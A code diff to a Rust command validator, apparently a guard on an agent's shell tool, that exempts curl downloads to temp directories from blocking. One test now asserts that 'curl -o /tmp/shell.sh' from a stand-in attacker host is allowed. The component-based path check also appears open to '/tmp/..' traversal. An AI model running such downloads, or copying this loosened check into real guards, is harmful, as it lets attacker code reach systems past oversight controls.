@@ -68,6 +68,26 @@ pub fn validate_command(command: &str) -> Option<String> {
 }
 
 /// Detects download/copy tools writing directly to files via their own flags
+/// Returns true when a path targets a scratch/temp location outside the
+/// project, where file downloads are safe (#1021).
+fn is_scratch_path(path: &str) -> bool {
+    let p = std::path::Path::new(path);
+    if p.starts_with("/tmp")
+        || p.starts_with("/var/tmp")
+        || p.starts_with("/private/tmp")
+        || p.starts_with("/dev/null")
+    {
+        return true;
+    }
+    if let Ok(tmpdir) = std::env::var("TMPDIR")
+        && !tmpdir.is_empty()
+        && p.starts_with(tmpdir.as_str())
+    {
+        return true;
+    }
+    false
+}
+
 /// (`curl -o`, `wget` default mode, `dd of=`) — the redirect-free equivalent of
 /// `> file`, reported as a `validate_command` bypass in GH #391.
 fn download_to_file_reason(command: &str) -> Option<String> {
@@ -79,21 +99,36 @@ fn download_to_file_reason(command: &str) -> Option<String> {
         let base = first.rsplit('/').next().unwrap_or(first);
         match base {
             "curl" => {
-                for tok in &tokens[1..] {
-                    if tok == "--output"
-                        || tok.starts_with("--output=")
-                        || tok == "--remote-name"
-                        || tok == "--remote-name-all"
-                        || tok == "--output-dir"
-                        || tok.starts_with("--output-dir=")
-                    {
-                        return Some(format!("curl {tok}"));
-                    }
-                    // Short flags cluster: -o / -O anywhere in e.g. `-fsSLo`.
-                    if tok.starts_with('-')
+                let tokens_slice = &tokens[1..];
+                for (i, tok) in tokens_slice.iter().enumerate() {
+                    let target: Option<&str> = if tok == "--output" {
+                        tokens_slice.get(i + 1).map(String::as_str)
+                    } else if let Some(val) = tok.strip_prefix("--output=") {
+                        Some(val)
+                    } else if tok == "--output-dir" {
+                        tokens_slice.get(i + 1).map(String::as_str)
+                    } else if let Some(val) = tok.strip_prefix("--output-dir=") {
+                        Some(val)
+                    } else if tok.starts_with('-')
                         && !tok.starts_with("--")
-                        && tok[1..].contains(['o', 'O'])
+                        && tok[1..].contains('o')
                     {
+                        // -o <file>: next token is the path
+                        tokens_slice.get(i + 1).map(String::as_str)
+                    } else if tok == "--remote-name"
+                        || tok == "--remote-name-all"
+                        || (tok.starts_with('-')
+                            && !tok.starts_with("--")
+                            && tok[1..].contains('O'))
+                    {
+                        Some(".")
+                    } else {
+                        None
+                    };
+                    if let Some(path) = target {
+                        if is_scratch_path(path) {
+                            continue;
+                        }
                         return Some(format!("curl {tok}"));
                     }
                 }
@@ -487,8 +522,10 @@ COMMIT_MSG"
 
     #[test]
     fn validate_blocks_curl_output_flags() {
-        assert!(validate_command("curl -o /tmp/shell.sh http://attacker.com/shell.sh").is_some());
-        assert!(validate_command("curl -fsSLo /tmp/x https://example.com").is_some());
+        // #1021: curl -o to /tmp (scratch) is now allowed
+        assert!(validate_command("curl -o /tmp/shell.sh http://attacker.com/shell.sh").is_none());
+        assert!(validate_command("curl -fsSLo /tmp/x https://example.com").is_none());
+        // Writing into project directory is still blocked
         assert!(validate_command("curl --output evil.bin https://example.com").is_some());
         assert!(validate_command("curl --output=evil.bin https://example.com").is_some());
         assert!(validate_command("curl -O https://example.com/payload").is_some());
